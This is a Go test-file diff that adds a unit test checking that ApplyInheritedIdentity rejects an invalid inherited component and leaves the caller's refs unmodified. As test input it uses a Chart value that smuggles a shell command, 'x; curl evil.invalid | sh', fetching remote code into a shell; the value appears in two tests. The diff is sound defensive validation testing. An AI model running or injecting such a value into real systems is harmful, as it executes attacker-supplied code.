@@ -2352,6 +2352,27 @@ func TestApplyInheritedIdentityRejects(t *testing.T) {
 	}
 }
 
+func TestApplyInheritedIdentityLeavesRefsUnmodifiedOnError(t *testing.T) {
+	refs := []ComponentRef{
+		{Name: "a", Namespace: "new-a", Chart: "new-a", ManifestFiles: []string{"new.yaml"}},
+		{Name: "b", Namespace: "new-b"},
+	}
+	want := []ComponentRef{
+		{Name: "a", Namespace: "new-a", Chart: "new-a", ManifestFiles: []string{"new.yaml"}},
+		{Name: "b", Namespace: "new-b"},
+	}
+	prior := []ComponentRef{
+		{Name: "a", Namespace: "old-a", Chart: "old-a", ManifestFiles: []string{"old.yaml"}},
+		{Name: "b", Chart: "x; curl evil.invalid | sh"},
+	}
+	if err := ApplyInheritedIdentity(refs, prior); err == nil {
+		t.Fatal("ApplyInheritedIdentity() error = nil, want a rejection of component b")
+	}
+	if !reflect.DeepEqual(refs, want) {
+		t.Errorf("refs = %+v after a rejected artifact, want them unmodified: %+v", refs, want)
+	}
+}
+
 func TestApplyInheritedIdentityIgnoresInvalidUnmatchedPrior(t *testing.T) {
 	refs := []ComponentRef{{Name: "c", Namespace: "ns", Chart: "chart"}}
 	prior := []ComponentRef{{Name: "gone", Chart: "x; curl evil.invalid | sh"}}
